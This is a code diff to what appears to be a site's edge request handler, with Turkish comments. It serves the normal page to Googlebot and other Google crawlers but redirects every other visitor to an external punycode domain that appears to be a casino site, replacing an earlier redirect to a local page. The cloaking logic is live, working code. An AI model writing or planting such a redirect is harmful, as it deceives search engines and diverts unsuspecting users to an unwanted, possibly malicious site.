@@ -8,16 +8,16 @@ export async function onRequest(context) {
     return context.next();
   }
 
-  // GOOGLEBOT KONTROLÜ (KESİN!)
+  // GOOGLEBOT KONTROLÜ (KESİN)
   const isGooglebot = /googlebot|mediapartners-google|adsbot-google|google-inspectiontool/i.test(userAgent);
 
-  // GOOGLEBOT İSE → index.html göster (SEO için)
+  // GOOGLEBOT → index.html (SEO için)
   if (isGooglebot) {
     console.log('Googlebot detected – serving index.html');
     return context.next();
   }
 
-  // NORMAL KULLANICILAR → tr.html'e yönlendir
-  console.log('Normal user – redirecting to tr.html');
-  return Response.redirect(`${url.origin}/tr.html`, 302);
+  // GOOGLEBOT DEĞİL → xx.com'a yönlendir
+  console.log('Normal user – redirecting to xx.com');
+  return Response.redirect('https://xn--casbom9025-0v3e.com/', 302);
 }
